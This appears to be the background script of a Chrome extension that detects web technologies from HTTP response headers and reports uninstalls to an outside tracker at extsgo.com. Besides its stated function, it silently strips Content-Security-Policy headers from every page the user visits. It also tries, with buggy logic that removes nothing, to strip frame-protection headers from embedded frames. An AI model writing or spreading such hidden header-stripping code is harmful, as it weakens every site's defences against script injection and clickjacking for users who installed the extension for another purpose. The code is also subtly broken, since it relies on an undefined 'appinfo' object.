window.dd = function() {};
var tabinfo = {},
  knownHeaders = {
    "x-powered-by": {
      "Express.js": /Express/,
      PHP: /PHP\/?(.*)/,
      Dinkly: /DINKLY\/?(.*)/,
      "ASP.NET": /ASP\.NET/,
      Nette: /Nette Framework/
    },
    server: {
      Apache: /Apache\/?(.*)/,
      nginx: /nginx\/?(.*)/,
      IIS: /Microsoft-IIS\/?(.*)/
    },
    via: { Varnish: /(.*) varnish/ }
  },
  headerDetector = function(a) {
    for (var b, c = [], d = a.length - 1; 0 <= d; d--)
      if (((b = knownHeaders[a[d].name.toLowerCase()]), !!b))
        for (var e in b) {
          var f = a[d].value.match(b[e]);
          if (f) {
            var g = f[1] || -1;
            c[e] = g;
          }
        }
    return c;
  };
chrome.webRequest.onHeadersReceived.addListener(
  function(a) {
    var b = headerDetector(a.responseHeaders);
    (tabinfo[a.tabId] = tabinfo[a.tabId] || {}), (tabinfo[a.tabId].headers = b);
  },
  { urls: ["<all_urls>"], types: ["main_frame"] },
  ["responseHeaders"]
),
  chrome.tabs.onRemoved.addListener(function(a) {
    delete tabinfo[a];
  }),
  (() => {
    (() =>
      chrome.contextMenus
        ? void (chrome.contextMenus.create({
            title: "EULA",
            contexts: ["browser_action"],
            onclick: function() {
              window.open("/html/doc/eula.html", "_blank");
            }
          }),
          chrome.contextMenus.create({
            title: "Privacy Policy",
            contexts: ["browser_action"],
            onclick: function() {
              window.open("/html/doc/pp.html", "_blank");
            }
          }),
          chrome.contextMenus.create({
            title: "Terms and Conditions",
            contexts: ["browser_action"],
            onclick: function() {
              window.open("/html/doc/tandc.html", "_blank");
            }
          }))
        : void console.log("Chrome contextMenus access failed"))();
  })(),
  chrome.runtime.setUninstallURL(
    "http://extsgo.com/api/tracker/uninstall?ext_id=" + chrome.runtime.id
  ),
  chrome.extension.onMessage.addListener(function(a, b, c) {
    if ("result" == a.msg) {
      var d = tabinfo[b.tab.id];
      for (var e in ((d.apps = a.apps), d.headers)) d.apps[e] = d.headers[e];
      var f = null;
      for (var g in a.apps) {
        if (null == f) {
          f = g;
          continue;
        }
        appinfo[g].priority &&
          (appinfo[f].priority
            ? appinfo[f].priority > appinfo[g].priority && (f = g)
            : (f = g));
      }
      var h = appinfo[f];
      if (h) {
        var i = h.title ? h.title : f;
        "-1" != a.apps[f] && (i = f + " " + a.apps[f]),
          chrome.pageAction.setIcon({
            tabId: b.tab.id,
            path: "apps/" + h.icon
          }),
          chrome.pageAction.setTitle({ tabId: b.tab.id, title: i });
      }
      chrome.pageAction.show(b.tab.id), c({});
    } else if ("get" == a.msg) {
      var j = tabinfo[a.tab];
      c(j);
    }
  });

chrome.webRequest.onHeadersReceived.addListener(
  details => ({
    responseHeaders: details.responseHeaders.filter(
      header => header.name.toLowerCase() !== "content-security-policy"
    )
  }),
  {
    urls: ["<all_urls>"]
  },
  ["blocking", "responseHeaders"]
);

chrome.webRequest.onHeadersReceived.addListener(
  details => ({
    responseHeaders: details.responseHeaders.filter(
      header =>
        header.name.toLowerCase() !== "frame-options" ||
        header.name.toLowerCase() !== "x-frame-options"
    )
  }),
  {
    urls: ["*://*/*"],
    types: ["sub_frame"]
  },
  ["blocking", "responseHeaders"]
);
